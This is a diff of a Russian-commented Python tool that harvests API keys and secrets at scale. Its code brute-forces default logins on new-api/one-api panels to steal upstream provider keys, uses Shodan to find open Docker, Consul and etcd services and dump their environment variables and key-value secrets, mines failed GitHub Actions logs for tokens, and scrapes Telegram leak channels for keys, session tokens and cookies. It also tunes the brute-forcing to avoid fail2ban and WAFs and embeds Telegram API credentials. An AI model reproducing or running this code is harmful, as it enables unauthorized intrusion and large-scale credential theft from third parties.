     # анти-спам TG: панель постится раз в 24ч (P1.1)
     CRACKED_STATE_PATH = os.path.join(HERE, "newapi_cracked.json")
+    # негативный кэш: хосты, где ВСЕ дефолт-креды мимо, не брутим 24ч
+    # (было: ребрут каждый проход ротации = приглашение fail2ban/WAF)
+    NEG_STATE_PATH = os.path.join(HERE, "newapi_neg.json")
 
     def _cracked_state(self):
         try:
@@ -6045,7 +7162,21 @@ class NewApiSweep(Source):
 
     def _save_cracked_state(self, st):
         try:
-            json.dump(st, open(self.CRACKED_STATE_PATH, "w", encoding="utf-8"))
+            _atomic_json_dump(self.CRACKED_STATE_PATH, st)
+        except Exception:
+            pass
+
+    def _neg_state(self):
+        try:
+            st = json.load(open(self.NEG_STATE_PATH, encoding="utf-8"))
+            cut = time.time() - 86400
+            return {h: t for h, t in st.items() if t > cut}
+        except Exception:
+            return {}
+
+    def _save_neg_state(self, st):
+        try:
+            _atomic_json_dump(self.NEG_STATE_PATH, st)
         except Exception:
             pass
 
@@ -6107,12 +7238,17 @@ class NewApiSweep(Source):
     def fetch(self):
         out = []
         roots = self._panel_roots()
+        # негативный кэш: отфильтровываем недавно отбрутленные
+        neg = self._neg_state()
+        if neg:
+            roots = [r for r in roots if r not in neg]
         # ротация: 60 корней за цикл (IP:port-панели короткоживущие — темп важен)
         rot = int(time.time() // 600)
         per = 60
         if len(roots) > per:
             start = (rot * per) % len(roots)
             roots = [roots[(start + i) % len(roots)] for i in range(per)]
+        _neg_new = []  # потокобезопасно: crack() отдаёт негативы наружу
 
         def _normalize_items(j):
             """data бывает списком ИЛИ {"items":[...]} — форки one-api разные
@@ -6168,52 +7304,64 @@ class NewApiSweep(Source):
                 if base:
                     break
             if not base:
+                _neg_new.append(root)  # все креды мимо — 24ч не брутим
                 return found
             cracked = False
             # /api/channel/ — АПСТРИМ-КЛЮЧИ ПРОВАЙДЕРОВ (джекпот!)
-            for p0 in ("0", "1"):
+            # пагинация до пустой страницы (было: p=0,1 — панели с 200+
+            # каналами отдавали только первые 200 апстрим-ключей)
+            all_ch = []
+            for p0 in range(5):
                 try:
                     r = sess.get(
                         base + "/api/channel/?p=%s&size=100" % p0, timeout=(6, 12)
                     )
                     if r.status_code != 200:
-                        continue
-                    items = _normalize_items(r.json())
-                    if items:
-                        txt = json.dumps(items, ensure_ascii=False)
-                        if any(
-                            m in txt for m in ("sk-", "AIza", "gsk_", "hf_", "xai-")
-                        ):
-                            found.append((txt, "newapi-channels:%s" % base))
-                            log("  🥇 ПАНЕЛЬ ВСКРЫТА (channels): %s" % base)
-                            cracked = True
                         break
+                    items = _normalize_items(r.json())
+                    if not items:
+                        break
+                    all_ch.extend(items)
                 except Exception:
-                    continue
-            # /api/token/ — юзерские токены панели
-            for p0 in ("0", "1"):
+                    break
+            if all_ch:
+                txt = json.dumps(all_ch, ensure_ascii=False)
+                if any(m in txt for m in ("sk-", "AIza", "gsk_", "hf_", "xai-")):
+                    found.append((txt, "newapi-channels:%s" % base))
+                    log("  🥇 ПАНЕЛЬ ВСКРЫТА (channels x%d): %s" % (len(all_ch), base))
+                    cracked = True
+            # /api/token/ — юзерские токены панели (та же пагинация)
+            all_tk = []
+            for p0 in range(3):
                 try:
                     r = sess.get(
                         base + "/api/token/?p=%s&size=100" % p0, timeout=(6, 12)
                     )
                     if r.status_code != 200:
-                        continue
-                    items = _normalize_items(r.json())
-                    if items:
-                        txt = json.dumps(items, ensure_ascii=False)
-                        if "sk-" in txt:
-                            found.append((txt, "newapi-tokens:%s" % base))
-                            cracked = True
                         break
+                    items = _normalize_items(r.json())
+                    if not items:
+                        break
+                    all_tk.extend(items)
                 except Exception:
-                    continue
+                    break
+            if all_tk:
+                txt = json.dumps(all_tk, ensure_ascii=False)
+                if "sk-" in txt:
+                    found.append((txt, "newapi-tokens:%s" % base))
+                    cracked = True
             if cracked:
                 # джекпот не ждёт пайплайна — прямой TG-пост (P1.1), раз в 24ч
                 try:
-                    st = self._cracked_state()
-                    if time.time() - float(st.get(base, 0) or 0) > 86400:
-                        st[base] = time.time()
-                        self._save_cracked_state(st)
+                    # АУДИТ-фикс: read-modify-write из 18 воркеров без лока
+                    # — две панели в одно окно теряли одну запись (дубль-посты)
+                    with LOCK:
+                        st = self._cracked_state()
+                        _fresh = time.time() - float(st.get(base, 0) or 0) > 86400
+                        if _fresh:
+                            st[base] = time.time()
+                            self._save_cracked_state(st)
+                    if _fresh:
                         preview = re.findall(
                             r"sk-[A-Za-z0-9_\-]{20,}",
                             " ".join(t for t, _ in found),
@@ -6229,6 +7377,15 @@ class NewApiSweep(Source):
         with concurrent.futures.ThreadPoolExecutor(max_workers=18) as ex:
             for res in ex.map(crack, roots):
                 out.extend(res)
+        # сейв негативного кэша (хосты, где все дефолт-креды мимо — 24ч тишина)
+        if _neg_new:
+            try:
+                st = self._neg_state()
+                for r0 in _neg_new:
+                    st[r0] = time.time()
+                self._save_neg_state(st)
+            except Exception:
+                pass
         if out:
             log("  [newapi-sweep] %d панелей вскрыто!" % (len(out) // 2 or 1))
         return out
@@ -6280,12 +7437,24 @@ class GHActionsLogs(Source):
                 continue
         repos = list(repos)[:30]  # P1.5: было 20
 
+        # персистентный дедуп ранов (было: одни и те же zip-логи качались
+        # каждый цикл, пока ран не уезжал из топ-3 окна — жгли квоту впустую)
+        _seen_path = os.path.join(HERE, "gh_actions_seen.json")
+        try:
+            _run_seen = json.load(open(_seen_path, encoding="utf-8"))
+        except Exception:
+            _run_seen = {}
+        _cut = time.time() - 3 * 86400  # TTL 3д: старые ран-ids выметаем
+        _run_seen = {k: t for k, t in _run_seen.items() if t > _cut}
+
         run_ids = []
         for repo in repos:
             try:
+                # failure-first: в упавших ранах set -x/env-дампы палят токены
                 r = http(
                     "GET",
-                    "https://api.github.com/repos/%s/actions/runs?per_page=3" % repo,
+                    "https://api.github.com/repos/%s/actions/runs?per_page=5&status=failure"
+                    % repo,
                     timeout=(8, 15),
                     headers=headers,
                 )
@@ -6293,7 +7462,7 @@ class GHActionsLogs(Source):
                     continue
                 for run in r.json().get("workflow_runs") or []:
                     rid = run.get("id")
-                    if rid:
+                    if rid and str(rid) not in _run_seen:
                         run_ids.append((repo, rid))
             except Exception:
                 continue
@@ -6309,8 +7478,13 @@ class GHActionsLogs(Source):
                 )
                 if r.status_code != 200 or not r.content:
                     return texts
+                _run_seen[str(rid)] = time.time()  # скачан — больше не тянем
                 zf = zipfile.ZipFile(_io.BytesIO(r.content))
-                for name in zf.namelist()[:40]:
+                # сначала текстовые job-логи, потом остальное (было: первые 40
+                # имён — секреты в поздних job'ах терялись)
+                names = zf.namelist()
+                names.sort(key=lambda n: 0 if n.endswith((".txt", ".log")) else 1)
+                for name in names[:80]:
                     try:
                         t = zf.read(name).decode("utf-8", "replace")
                     except Exception:
@@ -6335,6 +7509,10 @@ class GHActionsLogs(Source):
         with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
             for texts in ex.map(lambda rr: dl_logs(*rr), run_ids[:60]):
                 out.extend(texts)
+        try:
+            _atomic_json_dump(_seen_path, _run_seen)
+        except Exception:
+            pass
         if out:
             log("  [gh-actions] %d логов с токенами" % len(out))
         return out
@@ -6371,7 +7549,7 @@ class ZoomEye(Source):
 
     def _save_state(self, st):
         try:
-            json.dump(st, open(self.STATE_PATH, "w", encoding="utf-8"))
+            _atomic_json_dump(self.STATE_PATH, st)
         except Exception:
             pass
 
@@ -6496,7 +7674,12 @@ class RelayScanner(Source):
         except Exception:
             pass
 
-        relay_hosts = sorted(relay_hosts)[:80]
+        relay_hosts = sorted(relay_hosts)
+        # ротация окна 80 (было: фиксированные первые 80 — хвост списка
+        # никогда не сканировался)
+        if len(relay_hosts) > 80:
+            _r0 = (int(time.time() // 600) * 80) % len(relay_hosts)
+            relay_hosts = (relay_hosts[_r0:] + relay_hosts[:_r0])[:80]
 
         # пробуем /api/channel, /api/status, /api/token — параллельно
         endpoints = [
@@ -6583,11 +7766,11 @@ class YouTubeHunt(Source):
         api_key = keys[int(st.get("idx") or 0) % len(keys)]
         st = {"ts": time.time(), "idx": (int(st.get("idx") or 0) + 1)}
         try:
-            json.dump(st, open(self.STATE_PATH, "w", encoding="utf-8"))
+            _atomic_json_dump(self.STATE_PATH, st)
         except Exception:
             pass
         out = []
-        for q in self.QUERIES[:2]:
+        for q in self.QUERIES:  # все 3 запроса (было: [:2] — LITELLM_MASTER_KEY мёртв)
             try:
                 r = http(
                     "GET",
@@ -6600,9 +7783,10 @@ class YouTubeHunt(Source):
                     continue
                 for item in (r.json().get("items") or [])[:5]:
                     sn = item.get("snippet") or {}
+                    vid_real = (item.get("id") or {}).get("videoId") or "?"
                     desc = str(sn.get("description") or "")
                     if desc.strip():
-                        out.append((desc, "youtube:%s" % (sn.get("videoId") or "?")))
+                        out.append((desc, "youtube:%s" % vid_real))
                     vid = (item.get("id") or {}).get("videoId")
                     if not vid:
                         continue
@@ -6637,7 +7821,9 @@ class SourcegraphSearch(Source):
     NOTE: с датацентровых IP ломится Cloudflare Turnstile (cloudscraper не
     проходит) — гейт 30 мин, чтобы не жечь бюджет цикла."""
 
-    name = "sourcegraph"
+    name = "sourcegraph-search"  # было "sourcegraph" — ДУБЛЬ имени с классом
+    # Sourcegraph выше; run_sources дедупал по имени и один источник молча
+    # отваливался из ротации
     STATE_PATH = os.path.join(HERE, "sourcegraph_state.json")
     QUERIES = (
         '"sk-ant-api03"',
@@ -6775,8 +7961,23 @@ class GreyNoiseEnrich(Source):
             ips = [str(h).rsplit(":", 1)[0] for h in known.keys()]
         except Exception:
             return []
+        # дневной бюджет community-тира (~50/сутки): считаем в файле,
+        # 429 — стоп до завтра (было: жгли все 30 запросов в первые циклы,
+        # остаток дня — гарантированные ошибки)
+        _gn_path = os.path.join(HERE, "greynoise_daily.json")
+        try:
+            _gn = json.load(open(_gn_path, encoding="utf-8"))
+        except Exception:
+            _gn = {}
+        _day = time.strftime("%Y-%m-%d")
+        if _gn.get("day") != _day:
+            _gn = {"day": _day, "n": 0}
+        if _gn.get("n", 0) >= 50:
+            return []
         out = []
         for ip in ips[:30]:
+            if _gn["n"] >= 50:
+                break
             try:
                 r = http(
                     "GET",
@@ -6784,10 +7985,18 @@ class GreyNoiseEnrich(Source):
                     timeout=(8, 15),
                     headers={"key": key, "Accept": "application/json"},
                 )
+                if r.status_code == 429:
+                    _gn["n"] = 50  # дневной кап исчерпан
+                    break
                 if r.status_code == 200 and r.text.strip():
+                    _gn["n"] += 1
                     out.append((r.text, "greynoise:%s" % ip))
             except Exception:
                 continue
+        try:
+            _atomic_json_dump(_gn_path, _gn)
+        except Exception:
+            pass
         return out
 
 
@@ -6853,8 +8062,9 @@ class InternetDB(Source):
                     endpoints[addr] = {"ts": time.time(), "src": "internetdb"}
                     new_eps[0] += 1
             txt = json.dumps(j, ensure_ascii=False)
-            if any(
-                m in txt.lower() for m in ("proxy", "api", "llm", "one-api", "new-api")
+            # word-boundary: голое "api" матчил "capistrano"/"rapid" (шум)
+            if re.search(
+                r"(?i)(proxy|(?<![a-z])api(?![a-z])|llm|one-api|new-api)", txt
             ):
                 out.append((txt, "internetdb:%s" % ip))
 
@@ -6960,6 +8170,451 @@ class HunterQianxin(Source):
         return out
 
 
+class DockerApiSweep(Source):
+    """🐋 ОТКРЫТЫЙ DOCKER API (port 2375 без TLS-auth) — ЗОЛОТАЯ ЖИЛА:
+    /containers/json -> inspect -> Config.Env содержит РАНТАЙМ-креды
+    контейнеров: LITELLM_MASTER_KEY, OPENAI_API_KEY, DATABASE_URL...
+    Люди крутят litellm/new-api в докере с ключами в env — забираем всё.
+    Отдельно от shodan-баннерных запросов: тут гоняем по ВСЕМ 2375-хостам."""
+
+    name = "docker-api"
+    _SEEN_PATH = property(lambda self: os.path.join(HERE, "docker_api_seen.json"))
+
+    def fetch(self):
+        keys = Shodan()._alive_pool(Shodan()._key_pool())
+        if not keys:
+            return []
+        try:
+            seen = json.load(open(self._SEEN_PATH, encoding="utf-8"))
+        except Exception:
+            seen = {}
+        now = time.time()
+        # TTL: трупы/пустые 3д, успешные 7д
+        seen = {
+            k: v
+            for k, v in seen.items()
+            if now - (v.get("ts") or 0) < (7 * 86400 if v.get("hit") else 3 * 86400)
+        }
+        cyc = int(now // 600)
+        page = (cyc % 20) + 1  # ~7k хостов на 2375 — гоняем страницы по кругу
+        matches = []
+        for sk in keys:
+            try:
+                r = requests.get(
+                    "https://api.shodan.io/shodan/host/search",
+                    params={"key": sk, "query": "port:2375", "page": page},
+                    timeout=(10, 25),
+                    verify=False,
+                )
+                if r.status_code == 429:
+                    time.sleep(3)
+                    continue
+                if r.status_code != 200:
+                    break
+                matches = r.json().get("matches") or []
+                break
+            except Exception:
+                break
+        if not matches:
+            return []
+        out = []
+
+        def probe(ip):
+            if ip in seen:
+                return []
+            base = "http://%s:2375" % ip
+            chunks = []
+            try:
+                r = requests.get(
+                    base + "/containers/json?all=1", timeout=(3, 6), verify=False
+                )
+                if r.status_code != 200:
+                    seen[ip] = {"ts": now, "hit": False}
+                    return []
+                conts = r.json() or []
+                hit = False
+                for c in conts[:8]:
+                    cid = c.get("Id")
+                    if not cid:
+                        continue
+                    try:
+                        ri = requests.get(
+                            "%s/containers/%s/json" % (base, cid),
+                            timeout=(3, 6),
+                            verify=False,
+                        )
+                        if ri.status_code != 200:
+                            continue
+                        j = ri.json()
+                        env = ((j.get("Config") or {}).get("Env")) or []
+                        if env:
+                            txt = "\n".join(str(e) for e in env)
+                            chunks.append(
+                                (txt, "docker-api:%s:%s" % (ip, c.get("Image", "?")))
+                            )
+                            hit = True
+                    except Exception:
+                        continue
+                seen[ip] = {"ts": now, "hit": hit}
+            except Exception:
+                seen[ip] = {"ts": now, "hit": False}
+                return []
+            return chunks
+
+        ips = []
+        for m in matches[:25]:
+            ip = m.get("ip_str")
+            if ip and ip not in seen:
+                ips.append(ip)
+        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
+            for chunks in ex.map(probe, ips):
+                out.extend(chunks)
+        try:
+            _atomic_json_dump(self._SEEN_PATH, seen)
+        except Exception:
+            pass
+        if out:
+            log("  🐋 docker-api: %d env-дампов с открытых хостов" % len(out))
+        return out
+
+
+class ConsulSweep(Source):
+    """🏛️ Открытый Consul KV (port 8500 без ACL): /v1/kv/?recurse отдаёт ВСЕ
+    ключи-значения кластера — конфиги с токенами/паролями в plain/base64.
+    Плюс etcd (2379 /v2/keys?recursive=true) той же механикой."""
+
+    name = "consul-kv"
+    _SEEN_PATH = property(lambda self: os.path.join(HERE, "consul_seen.json"))
+
+    def fetch(self):
+        keys = Shodan()._alive_pool(Shodan()._key_pool())
+        if not keys:
+            return []
+        try:
+            seen = json.load(open(self._SEEN_PATH, encoding="utf-8"))
+        except Exception:
+            seen = {}
+        now = time.time()
+        seen = {k: v for k, v in seen.items() if now - (v.get("ts") or 0) < 3 * 86400}
+        cyc = int(now // 600)
+        # consul 8500 и etcd 2379 ротацией (чередуем по циклам)
+        q, port, kind = (
+            ('port:8500 "consul"', 8500, "consul")
+            if cyc % 2 == 0
+            else ('port:2379 "etcd"', 2379, "etcd")
+        )
+        page = ((cyc // 2) % 10) + 1
+        matches = []
+        for sk in keys:
+            try:
+                r = requests.get(
+                    "https://api.shodan.io/shodan/host/search",
+                    params={"key": sk, "query": q, "page": page},
+                    timeout=(10, 25),
+                    verify=False,
+                )
+                if r.status_code == 429:
+                    time.sleep(3)
+                    continue
+                if r.status_code != 200:
+                    break
+                matches = r.json().get("matches") or []
+                break
+            except Exception:
+                break
+        if not matches:
+            return []
+        out = []
+
+        def probe(ip):
+            hid = "%s:%s" % (ip, port)
+            if hid in seen:
+                return []
+            base = "http://%s:%s" % (ip, port)
+            try:
+                if kind == "consul":
+                    r = requests.get(
+                        base + "/v1/kv/?recurse=true", timeout=(3, 8), verify=False
+                    )
+                    if r.status_code != 200 or not r.text.startswith("["):
+                        seen[hid] = {"ts": now}
+                        return []
+                    import base64 as _b
+
+                    vals = []
+                    for ent in (r.json() or [])[:400]:
+                        v = ent.get("Value")
+                        if not v:
+                            continue
+                        try:
+                            vals.append(
+                                "%s=%s"
+                                % (
+                                    ent.get("Key", "?"),
+                                    _b.b64decode(v).decode("utf-8", "replace"),
+                                )
+                            )
+                        except Exception:
+                            continue
+                    seen[hid] = {"ts": now}
+                    if vals:
+                        log("  🏛️ CONSUL KV %s — %d ключей!" % (hid, len(vals)))
+                        return [("\n".join(vals), "consul:%s" % hid)]
+                    return []
+                else:  # etcd v2 API
+                    r = requests.get(
+                        base + "/v2/keys?recursive=true", timeout=(3, 8), verify=False
+                    )
+                    if r.status_code != 200:
+                        seen[hid] = {"ts": now}
+                        return []
+                    seen[hid] = {"ts": now}
+                    if '"value"' in r.text:
+                        log("  🏛️ ETCD KV %s — есть ключи!" % hid)
+                        return [(r.text[:300_000], "etcd:%s" % hid)]
+                    return []
+            except Exception:
+                seen[hid] = {"ts": now}
+                return []
+
+        ips = []
+        for m in matches[:20]:
+            ip = m.get("ip_str")
+            if ip and ("%s:%s" % (ip, port)) not in seen:
+                ips.append(ip)
+        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
+            for chunks in ex.map(probe, ips):
+                out.extend(chunks)
+        try:
+            _atomic_json_dump(self._SEEN_PATH, seen)
+        except Exception:
+            pass
+        return out
+
+
+class TGGlobalHunt(Source):
+    """🌐 TG ГЛОБАЛЬНЫЙ ПОИСК через живую nyx_session (Telethon): свежие дампы
+    combolist-каналов — oat01/sid01/куки/ключи появляются там РАНЬШЕ github.
+    2 запроса за прогон, гейт 30 мин (жёсткий флуд-лимит у global search).
+    Сессия — ОТДЕЛЬНАЯ КОПИЯ файла (не делим SQLite с fresh_scan)."""
+
+    name = "tg-global"
+    SRC_SESSION = r"C:\OpenCodeWorkspace\tg\nyx_session.session"
+    KH_SESSION = r"C:\OpenCodeWorkspace\tg\nyx_session_kh"  # без .session суффикса
+    STATE_PATH = os.path.join(HERE, "tg_global_hunt.json")
+    API_ID = 35094427
+    API_HASH = "72251a8100fad5f4322a38b8161cff84"
+    GATE = 1800  # 30 минут между прогонами
+    QUERIES = (
+        "sk-proj-",
+        "OPENAI_API_KEY",
+        "sk-ant-oat01",
+        "sk-ant-sid01",
+        ".credentials.json claude",
+        "setup_token claude",
+        "cookies.txt netscape",
+        "LITELLM_MASTER_KEY",
+        "glpat-",
+        "dashscope sk-",
+    )
+    # имя канала содержит -> ключевой (фаза диалогов: приватки типа ZK,
+    # которых НЕТ в глобальном индексе)
+    CHAT_NAME_RE = re.compile(
+        r"(?i)(key|keys|ключ|combol|combo|private|api|proxy|llm|gpt|claude|"
+        r"token|free|халяв|dump|leak|слив|neural|subs|подпис|openai|anthropic|"
+        r"cursor|copilot|\bzk\b|взлом|аккаунт|account|shop|market|otp|"
+        r"cookie|куки|сессион|session|keys_hunt|hunt)"
+    )
+
+    def fetch(self):
+        import asyncio
+        import shutil
+
+        try:
+            st = json.load(open(self.STATE_PATH, encoding="utf-8"))
+        except Exception:
+            st = {}
+        now = time.time()
+        if now - float(st.get("ts") or 0) < self.GATE:
+            return []
+        # копия сессии для keyhunter (разово)
+        if not os.path.exists(self.KH_SESSION + ".session"):
+            try:
+                shutil.copy2(self.SRC_SESSION, self.KH_SESSION + ".session")
+            except Exception as e:
+                log("  [tg-global] нет сессии: %s" % e)
+                return []
+        rot = int(st.get("rot") or 0)
+        chat_rot = [int(st.get("chat_rot") or 0)]  # mutable для _run
+        qs = [
+            self.QUERIES[rot % len(self.QUERIES)],
+            self.QUERIES[(rot + 1) % len(self.QUERIES)],
+        ]
+        seen_ids = set(st.get("seen") or [])
+        out = []
+
+        async def _run():
+            from telethon import TelegramClient
+            from telethon.tl.functions.messages import SearchGlobalRequest
+            from telethon.tl.types import InputMessagesFilterEmpty, InputPeerEmpty
+            from telethon.errors import FloodWaitError
+
+            client = TelegramClient(
+                self.KH_SESSION,
+                self.API_ID,
+                self.API_HASH,
+                proxy=("socks5", "127.0.0.1", 10808),
+                connection_retries=1,
+            )
+            await client.connect()
+            try:
+                if not await client.is_user_authorized():
+                    log("  [tg-global] сессия не авторизована")
+                    return
+                for q in qs:
+                    try:
+                        res = await client(
+                            SearchGlobalRequest(
+                                q=q,
+                                filter=InputMessagesFilterEmpty(),
+                                min_date=None,
+                                max_date=None,
+                                offset_rate=0,
+                                offset_peer=InputPeerEmpty(),
+                                offset_id=0,
+                                limit=25,
+                            )
+                        )
+                    except FloodWaitError as fw:
+                        log(
+                            "  [tg-global] flood-wait %ds — стоп до следующего окна"
+                            % fw.seconds
+                        )
+                        break
+                    n_new = 0
+                    for m in getattr(res, "messages", []) or []:
+                        mid = getattr(m, "id", None)
+                        if mid is None:
+                            continue
+                        # АУДИТ-фикс: msg id УНИКАЛЕН ТОЛЬКО В РАМКАХ ЧАТА —
+                        # голый mid в глобальном seen скипал НОВЫЕ сообщения
+                        # других каналов с тем же порядковым номером
+                        _peer = getattr(m, "peer_id", None)
+                        _cid = (
+                            getattr(_peer, "channel_id", None)
+                            or getattr(_peer, "chat_id", None)
+                            or getattr(_peer, "user_id", None)
+                            or "g"
+                        )
+                        sid = "%s:%s" % (_cid, mid)
+                        if sid in seen_ids:
+                            continue
+                        seen_ids.add(sid)
+                        n_new += 1
+                        txt = getattr(m, "message", "") or ""
+                        # документы/код: Telethon отдаёт текст в message; если
+                        # есть file — имя файла тоже интересно
+                        doc = getattr(m, "file", None)
+                        if doc is not None and getattr(doc, "name", None):
+                            txt += "\nFILE: " + str(doc.name)
+                        if txt.strip():
+                            out.append((txt, "tg-global:%s" % q[:24]))
+                    if n_new:
+                        log("  [tg-global] %r: %d новых сообщений" % (q, n_new))
+                    await asyncio.sleep(4)  # щадим флуд-лимит
+
+                # ---- фаза 2: ДИАЛОГИ (приватные каналы — ZK и ко, их нет в
+                # глобальном индексе). 10 ключевых каналов за прогон, ротация.
+                try:
+                    dialogs = await client.get_dialogs(limit=250)
+                    key_chats = []
+                    for d in dialogs:
+                        title = getattr(d, "title", "") or getattr(d, "name", "") or ""
+                        if self.CHAT_NAME_RE.search(title):
+                            key_chats.append(d)
+                except FloodWaitError as fw:
+                    log("  [tg-global] dialogs flood-wait %ds" % fw.seconds)
+                    key_chats = []
+                except Exception:
+                    key_chats = []
+                if key_chats:
+                    batch = [
+                        key_chats[(chat_rot[0] + i) % len(key_chats)]
+                        for i in range(min(10, len(key_chats)))
+                    ]
+                    log(
+                        "  [tg-global] ключевых каналов: %d, батч %d"
+                        % (len(key_chats), len(batch))
+                    )
+                    for d in batch:
+                        title = getattr(d, "title", "") or getattr(d, "name", "") or "?"
+                        try:
+                            n_new = 0
+                            async for m in client.iter_messages(d, limit=50):
+                                mid = getattr(m, "id", None)
+                                if mid is None:
+                                    continue
+                                # тот же аудит-фикс: (чат, msg), не голый id
+                                _cid = (
+                                    getattr(d, "id", None)
+                                    or getattr(getattr(d, "entity", None), "id", None)
+                                    or "?"
+                                )
+                                sid = "%s:%s" % (_cid, mid)
+                                if sid in seen_ids:
+                                    continue
+                                seen_ids.add(sid)
+                                txt = getattr(m, "message", "") or ""
+                                doc = getattr(m, "file", None)
+                                if doc is not None and getattr(doc, "name", None):
+                                    txt += "\nFILE: " + str(doc.name)
+                                if len(txt) > 25:
+                                    out.append((txt, "tg-chat:%s" % title[:32]))
+                                    n_new += 1
+                            if n_new:
+                                log("    [%s] +%d сообщений" % (title[:40], n_new))
+                            await asyncio.sleep(3)
+                        except FloodWaitError as fw:
+                            log("    flood-wait %ds — стоп батч" % fw.seconds)
+                            break
+                        except Exception:
+                            continue
+            finally:
+                try:
+                    await client.disconnect()
+                except Exception:
+                    pass
+
+        _ok = True
+        try:
+            asyncio.run(_run())
+        except Exception as e:
+            _ok = False
+            log("  [tg-global] err: %s" % e)
+        # state: seen-хвост до 3000, rot++, ts.
+        # АУДИТ-фикс: ts/rot продвигаем ТОЛЬКО при успехе — иначе один
+        # сбой (сессия/сеть) сжигал 30-мин окно вхолостую. + атомарная запись.
+        try:
+            _st = {"seen": list(seen_ids)[-3000:]}
+            if _ok:
+                _st.update({"ts": now, "rot": rot + 2, "chat_rot": chat_rot[0] + 10})
+            else:
+                _st.update(
+                    {
+                        "ts": float(st.get("ts") or 0),
+                        "rot": rot,
+                        "chat_rot": chat_rot[0],
+                    }
+                )
+            _tmp = self.STATE_PATH + ".tmp"
+            with open(_tmp, "w", encoding="utf-8") as _f:
+                json.dump(_st, _f)
+            os.replace(_tmp, self.STATE_PATH)
+        except Exception:
+            pass
+        return out
+
+
 ALL_SOURCE_CLASSES = [
     Gists,
     Lobsters,
@@ -7017,7 +8672,8 @@ ALL_SOURCE_CLASSES = [
     RelayScanner,
     Feeds,
     # P2-волна: bitbucket-глубина, IP-enrichment, CN-краулеры
-    BitbucketSnippets,
+    # BitbucketSnippets: ВЫКЛ (аудит 2026-09-10) — API 2.0 snippets?role=public
+    # требует auth, role=public невалиден -> 401 навсегда, источник мёртв
     GreyNoiseEnrich,
     InternetDB,
     Quake360,
@@ -7025,6 +8681,14 @@ ALL_SOURCE_CLASSES = [
     # Unconventional wave: self-feeding YouTube, глобальный код-поиск
     YouTubeHunt,
     SourcegraphSearch,
+    # 🐋🏛️ инфра-свипы: открытые docker API (env контейнеров) + consul/etcd KV
+    DockerApiSweep,
+    ConsulSweep,
+    # 🌐 TG глобальный поиск (живая nyx_session, combolist-каналы)
+    TGGlobalHunt,
+    # АУДИТ-фикс 2026-09-10: класс был полностью написан (фингерпринтинг +
+    # автопроверка бордов), но НИГДЕ не инстанцировался — источник не работал
+    RelayBoards,
 ]
 
 
@@ -7036,13 +8700,38 @@ def load_seen():
         # (дедуп ломался, found.jsonl набивал дубли каждый цикл)
         return set(json.load(open(SEEN_PATH, encoding="utf-8-sig")))
     except Exception:
-        return set()
+        # коррупция seen НЕ должна обнулять дедуп (было: молча set() ->
+        # вся история ревалидировалась и репостилась в TG). Фолбэк на .bak
+        try:
+            return set(json.load(open(SEEN_PATH + ".bak", encoding="utf-8-sig")))
+        except Exception:
+            return set()
 
 
 def save_seen(seen):
+    # перед перезаписью катим текущий файл в .bak (страховка от кривой записи)
+    try:
+        if os.path.exists(SEEN_PATH):
+            os.replace(SEEN_PATH, SEEN_PATH + ".bak")
+    except Exception:
+        pass
     tmp = SEEN_PATH + ".tmp"
-    json.dump(sorted(seen), open(tmp, "w", encoding="utf-8"))
+    with open(tmp, "w", encoding="utf-8") as f:
+        json.dump(sorted(seen), f)
     os.replace(tmp, SEEN_PATH)
+
+
+def _atomic_json_dump(path, obj):
+    """АУДИТ-фикс: tmp+replace для ВСЕХ state-файлов — голый open("w") при
+    крэше/отключении питания оставлял обрезанный JSON, и следующий запуск
+    молча стартовал с пустого состояния (attempts/stats/evolved терялись)."""
+    try:
+        tmp = path + ".tmp"
+        with open(tmp, "w", encoding="utf-8") as f:
+            json.dump(obj, f, ensure_ascii=False)
+        os.replace(tmp, path)
+    except Exception:
+        pass
 
 
 # ------------------------------------------------------------------ VAULT SYNC
@@ -7121,13 +8810,18 @@ def vault_push_finds():
                 )
             except Exception:
                 remote_text = ""
+        elif r.status_code == 404:
+            sha, remote_text = None, ""  # файла ещё нет — создадим
+        else:
+            return  # 401/403/5xx: заливка без актуального sha бессмысленна
+            # (было: sha=None при существующем файле = PUT обречён)
         have = set()
         for line in remote_text.splitlines():
             try:
                 d = json.loads(line)
-                have.add(khash(d.get("key", ""), d.get("base")))
             except Exception:
                 continue
+            have.add(khash(d.get("key", ""), d.get("base")))
         merged = remote_text.rstrip("\n")
         added = 0
         for line in local_lines:
@@ -7143,8 +8837,6 @@ def vault_push_finds():
             added += 1
         if not added:
             return
-        import base64 as _b64
-
         body = {
             "message": "vault sync from local %s"
             % time.strftime("%FT%TZ", time.gmtime()),
@@ -7152,7 +8844,21 @@ def vault_push_finds():
         }
         if sha:
             body["sha"] = sha
-        pr = requests.put(api, headers=hdrs, json=body, timeout=(10, 30), verify=False)
+        for _attempt in range(2):
+            pr = requests.put(
+                api, headers=hdrs, json=body, timeout=(10, 30), verify=False
+            )
+            if pr.status_code == 409 and _attempt == 0:
+                # гонка с GH-ботом: перекурываем sha и ретраим ОДИН раз
+                # (было: 409 = весь батч тихо терялся до следующего 4-го цикла)
+                try:
+                    r2 = requests.get(api, headers=hdrs, timeout=(8, 20), verify=False)
+                    if r2.status_code == 200:
+                        body["sha"] = r2.json().get("sha")
+                        continue
+                except Exception:
+                    pass
+            break
         if pr.status_code in (200, 201):
             log("  🧠 vault sync: +%d находок ушло в общий мозг" % added)
     except Exception:
@@ -7208,7 +8914,11 @@ def try_bases(base_hint, tag):
             bases += [c for c in cands if c not in bases]
     # УМНОСТЬ: голый sk-ключ без контекста пробуем против ВСЕХ relay-баз
     # с лидербордов (утечки китайских релеев часто без контекста)
-    if tag in ("sk32", "sklong", "skgen") and not base_hint:
+    # АУДИТ-фикс: +bearer/sk20 — "Authorization: Bearer <token>" строки без
+    # URL рядом раньше получали bases=[] -> validate молча return None.
+    # Fail-closed контроли в validate() (PUBLIC_MODELS_BASES и ко) режут
+    # slug-спам, так что расширение безопасно.
+    if tag in ("sk32", "sklong", "skgen", "sk20", "bearer") and not base_hint:
         bases += relay_bases()
     return bases
 
@@ -7653,9 +9363,29 @@ def validate_google(key):
         if r is None:
             return None
         if r.status_code == 400 and "API key not valid" in r.text:
-            return None  # мёртв
+            return None  # мёртв (точный вердикт Google)
         if r.status_code in (403,):
-            return None
+            # АУДИТ-фикс: 403 ≠ мёртв. Это и "API не включена на проекте",
+            # и referrer/IP-restriction — ключ ВАЛИДЕН, просто ограничен.
+            # (рестриктед-ключи часто работают с правильным Origin/IP)
+            return {
+                "key": key,
+                "base": base,
+                "tag": "google",
